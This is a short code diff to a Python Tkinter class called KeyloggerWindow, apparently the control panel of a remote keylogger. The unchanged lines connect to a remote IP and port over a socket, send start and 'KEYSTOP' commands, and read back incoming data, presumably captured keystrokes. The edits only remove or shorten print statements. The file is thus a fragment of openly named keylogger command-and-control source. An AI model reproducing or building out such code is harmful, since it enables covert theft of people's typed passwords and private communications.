@@ -50,14 +50,12 @@ class KeyloggerWindow(Frame):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((self.ip, self.port_no))
         self.connection.send(cmd.encode())
-        print("Keylogging started.")
         conn = self.connection
         while True:
             self.data = conn.recv(1024)
             if not self.data:
                 break
             self.result = self.data.decode()
-            print(self.data.decode())
         
     def eventUnhook(self):
         cmd = "KEYSTOP"
@@ -71,7 +69,7 @@ class KeyloggerWindow(Frame):
             self.textMulti.configure(state='disabled')
             self.data=""      
         except:
-            print('Noooooooooo')    
+            print('No')    
     def eventDelete(self):
         self.textMulti.configure(state='normal')
         self.textMulti.delete('1.0',END)
